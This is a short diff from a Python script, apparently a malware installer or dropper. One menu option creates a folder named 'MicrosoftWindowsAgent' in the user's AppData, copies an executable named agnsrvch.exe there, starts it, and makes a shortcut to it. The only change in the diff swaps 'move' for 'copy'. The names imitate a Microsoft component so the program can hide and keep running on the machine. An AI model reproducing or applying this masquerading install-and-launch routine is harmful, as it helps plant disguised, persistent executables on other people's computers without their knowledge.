@@ -57,7 +57,7 @@ elif option == '1':
 elif option == '2':
     cmd(rf'mkdir %appdata%\MicrosoftWindowsAgent')
     cmd(rf'type nul > %appdata%\MicrosoftWindowsAgent\\log.txt')
-    cmd(rf"move agnsrvch.exe %appdata%\MicrosoftWindowsAgent\\")
+    cmd(rf"copy agnsrvch.exe %appdata%\MicrosoftWindowsAgent\\")
     cmd(rf"start %appdata%\MicrosoftWindowsAgent\\agnsrvch.exe")
     create_file_shortcut(f"{file_local_save}\MicrosoftWindowsAgent\\agnsrvch.exe", f"agnsrvch.dll")
     cmd("exit")
